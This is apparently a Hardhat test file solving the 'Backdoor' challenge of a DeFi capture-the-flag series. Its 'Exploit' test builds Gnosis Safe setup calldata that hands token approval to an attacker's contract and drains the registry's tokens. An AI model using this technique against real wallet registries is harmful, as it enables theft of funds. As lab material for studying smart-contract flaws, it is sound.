const { ethers } = require("hardhat")
const { expect } = require("chai")
const { constants } = require("@openzeppelin/test-helpers")
const { contract, accounts, web3 } = require("@openzeppelin/test-environment")
const utils = require("./utils")

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners()
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy()
        this.walletFactory = await (
            await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
        ).deploy()
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users)

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        walletRegistry = this.walletRegistry.connect(attacker)
        walletFactory = this.walletFactory.connect(attacker) //this.proxyFactory
        masterCopy = this.masterCopy.connect(attacker) //this.gnosisSafeImpl
        token = this.token.connect(attacker)

        exploit = await (
            await ethers.getContractFactory("Exploit", deployer)
        ).deploy(
            attacker.address,
            walletFactory.address,
            masterCopy.address,
            walletRegistry.address,
            token.address
        )

        const log = async () => {
            console.log("\t ===================================================")
            console.log(
                "\t masterCopy Token Balance:",
                (await token.balanceOf(masterCopy.address)).toString()
            )
            for (let i = 0; i < users.length; i++) {
                console.log("\t users address:", i, ":", users[i])
            }
            console.log("\t mastercopy address:", masterCopy.address)
            console.log("\t walletRegistry address:", walletRegistry.address)
            console.log("\t token address:", token.address)
            console.log("\t walletFactory address:", walletFactory.address)
            console.log("\t exploit address:", exploit.address)

            console.log("\t ===================================================")
        }

        //createProxyWithCallback()
        // address _singleton,  ->masterCopy
        // bytes memory initializer,
        // uint256 saltNonce,
        // IProxyCreationCallback callback ->IProxyCreationCallback callback

        await log()

        let functionSig =
            "function setup(address[],uint256,address,bytes,address,address,uint256,address)"
        let ABI = [functionSig]
        let regexConst = /function\s*(.*)\s*\(/
        var functionName = regexConst.exec(functionSig)

        //console.log("Function Name:", functionName[1])

        let iface = new ethers.utils.Interface(ABI)
        const selector = iface.getSighash(functionName[1])

        // console.log("Function Selector:", selector)

        // "0x1234567890123456789012345678901234567890",
        // ethers.utils.parseEther("1.0"),
        // console.log("ethers.utils.AddressZero", ethers.constants.AddressZero)
        zero = ethers.constants.AddressZero

        // function setup(
        //     address[] calldata _owners,
        //     uint256 _threshold,
        //     address to,
        //     bytes calldata data,
        //     address fallbackHandler,
        //     address paymentToken,
        //     uint256 payment,
        //     address payable paymentReceiver

        //createProxyWithCallback()
        // address _singleton,  ->masterCopy
        // bytes memory initializer,
        // uint256 saltNonce,
        // IProxyCreationCallback callback ->IProxyCreationCallback callback
        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"]
        const moduleIFace = new ethers.utils.Interface(moduleABI)
        const setupData = moduleIFace.encodeFunctionData("setupToken", [
            token.address,
            exploit.address,
        ])

        //malicious module

        // const moduleABI = ["function enableModule(address module)"]
        // const moduleIFace = new ethers.utils.Interface(moduleABI)
        // const setupData = moduleIFace.encodeFunctionData("enableModule", exploit.address)

        // Do exploit in one transaction (after contract deployment)
        await exploit.exploit(users, setupData)

        // let saltNonce = 0
        // for (let i = 0; i < users.length; i++) {
        //     let paramsArray = [[users[i]], 1, exploit.address, setupData, zero, zero, 0, zero]
        //     let callData = iface.encodeFunctionData(functionName[1], paramsArray)

        //     console.log("CallData", callData)
        //     await walletFactory.createProxyWithCallback(
        //         masterCopy.address, //_singleton
        //         callData, //initializer
        //         saltNonce, //saltNonce
        //         walletRegistry.address //callback
        //     )
        // }

        await log()
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i])

            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet")

            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false
        }

        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED)
    })
})
